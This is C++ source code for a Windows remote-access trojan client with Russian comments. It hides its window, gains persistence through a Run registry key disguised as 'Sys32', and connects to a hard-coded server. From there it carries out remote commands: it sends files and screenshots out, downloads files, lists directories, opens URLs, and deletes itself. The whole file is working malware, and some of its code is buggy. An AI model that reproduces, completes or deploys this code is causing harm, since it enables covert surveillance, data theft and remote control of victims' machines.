//Client
//Tasks: optimize
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string>
#include <iostream>
#include <winsock2.h>
#include <direct.h>
#include <fstream>
#include <windows.h>
#include <gdiplus.h>

#define PORT 666
#define SERVERADDR "192.168.1.69"
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib, "GdiPlus.lib")

static const GUID png =
{ 0x557cf406, 0x1a04, 0x11d3, { 0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e } };

using namespace std;

int main()
{
	setlocale(LC_ALL, "rus");
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);
	while (1) {
	char buffer2[256] = "";
	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
	std::string src = buffer2;
	std::string dst("C:\\Client.exe");
	std::string cmd = "copy " + src + " " + dst;
//	system(cmd.c_str());
	char dir[FILENAME_MAX];
	_getcwd(dir, sizeof(dir));
	char temp[] = "\\C.exe";

	strcat_s(dir, temp);
	DWORD dwtype = 0;
	DWORD dwBufsize = sizeof(dir);
	TCHAR szpath[MAX_PATH];
	HKEY hKeys;
	if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL))
	{
		RegSetValueEx(hKeys, "Sys32", 0, REG_SZ, reinterpret_cast<const BYTE*>(&buffer2), sizeof(buffer2));
		RegCloseKey(hKeys);
	}
	char buff[1024];
	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
		buff[i] = '\0';
	}

	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
	{
		return -1;
	}

	SOCKET my_sock;
	my_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (my_sock < 0)
	{
		return -1;
	}

	sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(PORT);
	HOSTENT *hst;


	if (inet_addr(SERVERADDR) != INADDR_NONE)
		dest_addr.sin_addr.s_addr = inet_addr(SERVERADDR);
	else
	{

		if (hst = gethostbyname(SERVERADDR))

			((unsigned long *)&dest_addr.sin_addr)[0] =
			((unsigned long **)hst->h_addr_list)[0][0];
		else
		{
			closesocket(my_sock);
			WSACleanup();
			return -1;
		}
	}

	if (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr)))
	{
		while (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))) {
			Sleep(5000);
			if (!(connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))))break;
		}
	}

	int nsize;
	while ((nsize = recv(my_sock, &buff[0], sizeof(buff) - 1, 0)) != SOCKET_ERROR)
	{

		buff[nsize] = 0;

		if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 's')) {
			HANDLE hFile;
			std::string result = buff + 4;
			hFile = CreateFile(result.c_str(),
				GENERIC_WRITE,
				0,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			const int bufsize = 1024;
			DWORD dwBytesWritten;
			bool start = true;
			int filesize = 0;
			int bytesrec = 0;
			do {
				int unread = 0;
				bool exit = false;
				char buff[bufsize] = "";
				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
				if (start) {
					//тут надо будет получить полный массив, т.е если буффер меньше 1024 то по одному элементу пихать в массив.
					for (int k = 0; sizeof(buff) / sizeof(char); k++) {
						if ((buff[k] == '%') && (buff[k + 1] == 'b') && (buff[k + 2] == 'y') && (buff[k + 3] == 't') && (buff[k + 4] == 'e') && (buff[k + 5] == '%')) {
							unread += 6;
							char *temp = new char[unread - 6];
							strncpy(temp, buff, unread - 6);
							filesize = atoi(temp);
							delete[]temp;
							break;
						}
						else {
							unread++;
						}
					}
					start = false;
					bytesrec += nbytes - unread;
				}
				else {
					bytesrec += nbytes;
				}
				if (nbytes == 0) {
					break;
				}
				if (nbytes < 0)
				{
					break;
				}
				WriteFile(hFile, buff + unread, nbytes - unread, &dwBytesWritten, NULL);
			} while (bytesrec < filesize);
			CloseHandle(hFile);
		}
		else if ((buff[0]=='d')&&(buff[1]=='e')&&(buff[2]=='l')) {
			char delfile[] = "@echo off\n:loop\ndel Client.exe\nif exist 1.txt goto : loop\ndel %0";
			ofstream File;
			File.open("del.bat");
			File << delfile;
			File.close();
			system("start del.bat");
			return 0;
		}
		else if ((buff[0] == 'd') && (buff[1] == 'i') && (buff[2] == 'r')) {
			const int buflen = 1024;
			WIN32_FIND_DATA FindFileData;
			char *ap;
			ap = buff + 4;
			HANDLE hf = FindFirstFile(ap, &FindFileData);
			char fileNames[200][MAX_PATH] = { "" };
			INT i = 0;
			if (hf == INVALID_HANDLE_VALUE) { puts("Path not found"); return 1; }
			cout << "Select one of the following files:\n";
			do {
				strcpy_s(fileNames[i], FindFileData.cFileName);
				cout << "[" << i << "]";
				puts(fileNames[i]);
				char buffer[buflen];
				strcpy_s(buffer, MAX_PATH, ap);
				strcat_s(buffer, MAX_PATH, "\\");
				strcat_s(buffer, MAX_PATH, FindFileData.cFileName);
				send(my_sock, buffer, buflen, 0);
				++i;
			} while (FindNextFile(hf, &FindFileData));
			send(my_sock, "^@@", 3, 0);
			FindClose(hf);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'o')) {
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'w')) {
			std::string url = buff + 4;
			ShellExecute(NULL, "open", url.c_str(), 0, 0, SW_SHOWNORMAL);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'e')) {
			return 0;
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
			std::string result = buff + 4;
			MessageBox(0, result.c_str(), "System", MB_OK);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'd')) {
			string fop = buff + 4;
			FILE *in;
			fopen_s(&in, fop.c_str(), "rb");
			long int size;
			fseek(in, 0, SEEK_END);
			size = ftell(in);
			fclose(in);
			char size1[256] = "";
			_itoa_s(size, size1, 10);
			strcat_s(size1, "%byte%\0");
			int len = 0;
			for (int i = 0; i < sizeof(size1) / sizeof(size); i++) {
				if (size1[i] != '\0')len++;
				else {
					break;
				}
			}
			send(my_sock, size1, len, 0);
			FILE *in1;
			fopen_s(&in1, fop.c_str(), "rb");
			const int buflen = 1024;
			int bytesen = 0;
			while (1) {
				char bufer[buflen] = "";
				int b = fread(bufer, 1, sizeof(bufer), in);
				send(my_sock, bufer, b, 0);
				if (b < buflen)break;
			}
			fclose(in1);
		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
			using namespace Gdiplus;
			GdiplusStartupInput gdiplusStartupInput;
			ULONG_PTR gdiplusToken;
			GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

			HDC scrdc, memdc;
			HBITMAP membit;
			scrdc = GetDC(0);
			int Height, Width;
			Height = GetSystemMetrics(SM_CYSCREEN);
			Width = GetSystemMetrics(SM_CXSCREEN);
			memdc = CreateCompatibleDC(scrdc);
			membit = CreateCompatibleBitmap(scrdc, Width, Height);
			SelectObject(memdc, membit);
			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
			HBITMAP hBitmap;
			hBitmap = (HBITMAP)SelectObject(memdc, membit);
			Gdiplus::Bitmap bitmap(hBitmap, NULL);
			bitmap.Save(L"screen.png", &png);
			DeleteObject(hBitmap);
			const int buflen = 1024;
			FILE *in;
			fopen_s(&in, "screen.png", "rb");
			long int size;
			fseek(in, 0, SEEK_END);
			size = ftell(in);
			fclose(in);
			char size1[256] = "";
			_itoa_s(size, size1, 10);
			strcat_s(size1, "%byte%\0");
			int len = 0;
			for (int i = 0; i < sizeof(size1) / sizeof(size); i++) {
				if (size1[i] != '\0')len++;
				else {
					break;
				}
			}
			send(my_sock, size1, len, 0);
			FILE *in1;
			fopen_s(&in1, "screen.png", "rb");
			int bytesen = 0;
			while (1) {
				char bufer[buflen] = "";
					int b = fread(bufer, 1, sizeof(bufer), in1);
					send(my_sock, bufer, b, 0);
					if (b < buflen)break;
			}
			fclose(in1);
			remove("screen.png");

		}
		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'l')) {
		char *file = buff + 4;
		ShellExecute(NULL, "open", "explorer.exe", file, NULL, SW_SHOWNORMAL);
}
	}
	closesocket(my_sock);
	WSACleanup();
}
	return 0;
}
